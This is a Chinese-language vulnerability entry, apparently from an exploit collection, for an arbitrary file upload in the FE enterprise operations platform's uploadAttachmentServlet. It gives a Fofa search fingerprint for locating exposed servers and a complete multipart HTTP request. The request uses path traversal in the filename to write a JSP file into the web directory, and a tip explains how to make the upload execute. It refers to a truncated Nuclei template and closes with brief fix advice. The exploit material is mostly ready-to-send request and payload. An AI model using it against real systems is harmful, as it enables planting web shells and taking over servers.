# 飞企互联-FE企业运营管理平台uploadAttachmentServlet任意文件上传

- **系统**：飞企互联-FE企业运营管理平台uploadAttachmentServlet　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="FE-协作平台"`
- **请求**：`POST /servlet/uploadAttachmentServlet HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app="FE-协作平台"
2、部分界面如下
3、隐患url,复现如下
/servlet/uploadAttachmentServlet
Host: your-ip
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
------WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/hello.jsp"
Content-Type: text/plain
<% out.println("hello");%>
------WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Disposition: form-data; name="json"
{"iq":{"query":{"UpdateType":"mail"}}}
------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
jsp文件上传后默认是不解析 ，需在文件名后加个；
Nuclei
id: fqfe-uploadattachmentserv…（脚本共 1486 字，完整版见原文）
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。